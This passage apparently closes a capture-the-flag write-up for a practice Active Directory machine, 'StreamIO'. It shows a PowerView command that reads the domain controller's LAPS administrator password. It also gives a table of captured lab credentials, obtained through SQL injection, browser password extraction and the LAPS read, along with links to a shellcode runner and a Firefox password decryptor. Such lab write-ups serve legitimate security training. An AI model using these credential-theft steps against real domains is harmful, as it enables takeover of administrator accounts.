powerpick Get-DomainComputer -Identity DC.streamIO.htb  -Properties ms-Mcs-AdmPwd
```

![alt text](../assets/images/streamio41.png)

GG!

## Creds

| username | password / hash | work at | from  | privileges |
| --- | --- | --- | --- | --- |
| yoshihide | 66boysandgirls.. | login page | MSSQL injection | - |
| db_admin | B1@hx31234567890 | MSSQL | register.php | mssql admin |
| nikk37 | [`get_dem_girls2@yahoo.com`](mailto:get_dem_girls2@yahoo.com) | LDAP,WINRM | MSSQL | firepwd |
| JDgodd | JDg0dd1s@d0p3cr3@t0r | LDAP | firepwd | Writeowner |
| Administrator | 5buA-U4};dJ)h{ | everyhere | LAPS | DA |

## Tools

https://github.com/lineeralgebra/shellcoderunner

https://github.com/lclevy/firepwd
